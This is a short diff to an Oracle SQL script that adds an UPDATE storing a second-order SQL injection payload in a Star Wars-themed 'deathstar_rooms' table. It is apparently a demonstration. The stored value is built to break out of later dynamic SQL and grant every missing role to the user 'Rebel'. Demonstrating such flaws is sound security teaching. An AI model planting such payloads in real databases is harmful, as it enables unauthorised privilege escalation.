@@ -10,7 +10,9 @@ column CREATED format a30
 column MESSAGE format a60
 alter session set nls_date_format='dd.MM.yyyy hh:mi:ss';
 
-rem update deathstar_rooms...
+-- Poison the deathstar_rooms table
+update deathstar_rooms set code = 'VADER''); insert into user_roles (id_user, id_role) select u.id, r.id from users u, roles r
+where (u.id, r.id) not in (select id_user, id_role from user_roles) and u.user_name in (''Rebel' where id = 2;
 set echo on
 cl scr
 --------------------------------------------------------------------------------------------------------
